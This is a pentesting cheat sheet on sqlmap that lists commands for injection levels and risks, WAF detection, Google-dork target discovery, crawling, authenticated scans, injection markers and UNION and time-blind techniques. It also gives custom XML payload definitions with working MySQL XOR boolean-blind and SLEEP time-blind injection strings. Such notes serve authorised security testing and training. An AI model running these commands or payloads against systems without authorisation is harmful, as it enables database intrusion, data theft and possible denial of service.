---
author(s):
  - Userware
tags:
  - webapp-pentesting
  - server-side-attack
  - sql-injection
  - blind-sql-injection
  - sqlmap
---
# 03 - Injection

## Payload Injection Test Levels

### Levels

Level 1 (by default) targets only basic GET and POST request parameters. Even if the flag is not specified it'll always use `--level=1` payloads to inject the URL. The amount of HTTP requests will always be less than 100.

```
$ sqlmap -u "<URL>" --level=1 -p <parameter_1>,<parameter_n>
```

Level 2 will target HTTP cookie header. The HTTP requests will be somewhere between 100 - 200.

```
$ sqlmap -u "<URL>" --level=2 -p <parameter>

$ sqlmap -u "<URL>" --level=2 --cookie="COOKIE=..." --param-exclude="COOKIE"

$ sqlmap -u "<URL>" --level=2 --cookie="COOKIE=..." --skip="cookies"

$ sqlmap -u "<URL>" --level=2 --cookie="COOKIE=..." -p <parameter>
```

Level 3 will will two additional HTTP headers which are **User-Agent** and **Referer** with additional payloads to inject. The **inline query** technique is reached to this level. The HTTP requests will be somewhere between 200 - 500.

```
$ sqlmap -u "<URL>" --level=3
```

Level 4 contains more payloads for certain type of techniques and no additional HTTP header type to inject. The HTTP requests will be somewhere between 500 - 1000.

```
$ sqlmap -u "<URL>" --level=4
```

Level 5 will inject **HTTP Host** with additional payloads contains on numerous techniques. The amount of HTTP requests will be more than 1000.

```
$ sqlmap -u "<URL>" --level=5
```

### Risks

Risks 1 (by default) contains payloads that are deemed safe to test on all levels. Even if the flag is not specified it'll always use `--risks=1` payloads to inject the URL. 

```
$ sqlmap -u "<URL>" --risks=1
```

Risk 2 contains payloads that might cause denial of service (DoS) which is usually for smaller sites. However, sqlmap has mechanisms to attempt and prevent it from happening.

```
$ sqlmap -u "<URL>" --risks=2
```

From this level and beyond has a huge risk by modifying the database to perform certain tasks.

```
$ sqlmap -u "<URL>" --risks=3
```

## Information Gathering

```
$ sqlmap -u "<URL>" --check-waf --identify-waf

$ sqlmap -g "<google_dork>" [--cookies="<google_cookies_session>"] --gpage="<page_number>" --random-agent

$ sqlmap -u "<URL>" --forms
```

```
$ sqlmap -u "<URL>" --crawl=5 --threads=5 --crawl-exclude="logout" --forms --batch --answers="keep testing=Y,sitemap=Y,skip further tests=N"
```

## Authentication Methods

```
$ sqlmap -u "<URL>" --cookie="<key_1>=<value_1>;<key_n>=<value_n>"

$ sqlmap -u "<URL>" --headers="Authorization=<value>"

$ sqlmap -u "<URL>" --auth-type=<Basic | Digest | Bearer | ...> --auth-cred=<username>:<password>

$ sqlmap -u "<URL>" --auth-file=/path/to/file.pem
```

### DBMS Authentication

```
$ sqlmap -u -d <scheme>://<username>:<password>@<IP>:<PORT>/<database_name> --dbms-cred=<username>:<password>
```

## Injection Markers

Specify the parameter

```
$ sqlmap -u "<URL>" -p <parameter>"
```

Skip parameters if they contain negative heuristic results. Proceed further injection on positive heuristics. This can be used to scan multiple URLs.

```
$ sqlmap -u "<URL>" --smart

$ sqlmap -m urls.txt --smart --batch
```

 Specify a HTTP header to inject

```
$ sqlmap -u "<URL>" --headers="<headers>"
```

Specify injection markers inside parameter values (`%INJECT_HERE%` or `*`).

```
$ sqlmap -u "http[s]://<IP>/?<parameter>=%INJECT_HERE%"

$ sqlmap -u "http[s]://<IP>/?<parameter>=*"

$ sqlmap -u "http[s]://<IP>/parameter*/"
```

- Setting boundaries of prefix and suffix to customize the injection.

```
$ sqlmap -u "<URL>" --prefix="'" --suffix="--"
```

## SQL Injection Techniques

### UNION-Based Query 

```
$ sqlmap -u "<URL>" --technique=U --union-cols=<number_of_columns>

$ sqlmap -u "<URL>" --technique=U --union-char="A1B2"

$ sqlmap -u "<URL>" --technique=U --union-from="<table_name>"
```

### Time-Blind Query

- This is also used for blind SQL Injection method

`$ sqlmap -u "<URL>" --technique=T --time-sec=<seconds>`

## Filter Payloads

`$ sqlmap -u "<URL>" --test-filter="<payload_title>"`

`$ sqlmap -u "<URL>" --test-skip="BENCHMARK"`

## Customize Payloads

```
/usr/share/sqlmap/data/xml/payloads
```

https://katsuragi.medium.com/customising-sqlmap-integrating-personalised-injection-payloads-1f4a1500e33b

```xml
    <test>
        <title>MySQL XOR boolean-based blind</title>
        <stype>1</stype>
        <level>1</level>
        <risk>1</risk>
        <clause>1-8</clause>
        <where>1</where>
        <vector>"XOR(IF((SELECT/**/666/**/WHERE/**/[INFERENCE]),444,0))XOR"</vector>
        <request>
            <payload>"XOR(IF((SELECT/**/666/**/WHERE/**/[RANDNUM]=[RANDNUM]),444,0))XOR"</payload>
        </request>
        <response>
            <comparison>"XOR(IF((SELECT/**/666/**/WHERE/**/[RANDNUM]=[RANDNUM1]),444,0))XOR"</comparison>
        </response>
        <details>
            <dbms>MySQL</dbms>
        </details>
    </test>
```

https://ott3rly.com/advanced-sqlmap-customization/

```xml
	<test>
	    <title>XOR time-based blind (query SLEEP)</title>
	    <stype>5</stype>
	    <level>1</level>
	    <risk>1</risk>
	    <clause>1,2,3,8,9</clause>
	    <where>1</where>
	    <vector>[RANDNUM]'XOR(IF(NOW()=SYSDATE(),SLEEP([SLEEPTIME]),0))XOR'[RANDSTR]</vector>
	    <request>
	        <payload>[RANDNUM]'XOR(IF(NOW()=SYSDATE(),SLEEP([SLEEPTIME]),0))XOR'[RANDSTR]</payload>
	    </request>
	    <response>
	        <time>[SLEEPTIME]</time>
	    </response>
	</test>
```

- [Week 7 - Advanced SQLMap](https://www.webhackingtips.com/weekly-tips/week-7-advanced-sqlmap)

---
## References

- [Cybr: sqlmap cheat sheets to help you find SQL injections](https://cybr.com/ethical-hacking-archives/sqlmap-cheat-sheets-to-help-you-find-sql-injections/)